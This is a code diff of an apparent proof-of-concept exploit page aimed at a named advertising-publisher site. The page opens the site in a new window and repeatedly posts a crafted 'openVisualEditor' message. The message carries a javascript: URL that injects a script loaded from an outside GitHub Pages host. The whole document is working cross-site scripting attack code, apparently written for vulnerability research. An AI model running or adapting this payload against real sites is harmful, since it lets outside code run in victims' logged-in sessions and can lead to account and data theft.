@@ -10,14 +10,24 @@
     const rangersDomain =
       "javascript://%0avoid((function(){var%20w=window.opener%7C%7Cwindow;var%20s=w.document.createElement('script');s.src='https://johnstonemees.github.io/poc/tiktok/poc.js';(w.document.body%7C%7Cw.document.documentElement).appendChild(s)})())//fedev-web-visual/";
     
-
+    let timer = null;
     bbtestgo = window.open("https://www.pangleglobal.com/publisher/report","_blank");
-    setTimeout(function(){
-             bbtestgo.postMessage({
-                type: 'tea:openVisualEditor',
-                referrer: { apiDomain: API_DOMAIN, rangersDomain },
-                lang: 'zh',
-              }, '*');
-  },15000)
+	timer = setInterval(function(){
+        bbtestgo.postMessage({
+        type: 'tea:openVisualEditor',
+        referrer: { apiDomain: API_DOMAIN, rangersDomain },
+        lang: 'zh',
+        }, '*');
+    },5000);
+	 
+	 window.addEventListener('message', (event) => {
+	      const data = event.data;
+	      if (data.type === 'pause') {
+	        if (timer) {
+	          clearInterval(timer);
+	          timer = null;
+	        }
+	      }
+	    });
    </script>
 </html>
